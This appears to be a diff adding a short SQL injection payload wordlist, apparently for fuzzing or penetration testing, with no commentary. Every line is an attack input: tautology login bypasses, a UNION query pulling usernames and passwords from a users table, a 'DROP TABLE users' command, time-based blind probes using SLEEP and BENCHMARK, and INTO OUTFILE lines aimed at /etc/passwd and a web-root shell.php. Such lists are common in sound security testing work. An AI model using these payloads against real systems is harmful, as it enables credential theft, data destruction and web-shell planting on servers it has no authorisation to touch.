@@ -1,0 +1,22 @@
+'
+''
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' AND 1=1
+' AND 1=2
+' OR 'a'='a
+' OR 'a'='b
+' OR 1=1 LIMIT 1--
+' OR 1=1 UNION SELECT 1,2,3
+'; DROP TABLE users--
+'; SELECT SLEEP(5)--
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+' OR BENCHMARK(1000000,MD5('test'))--
+' OR 1=1 INTO OUTFILE '/etc/passwd'--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
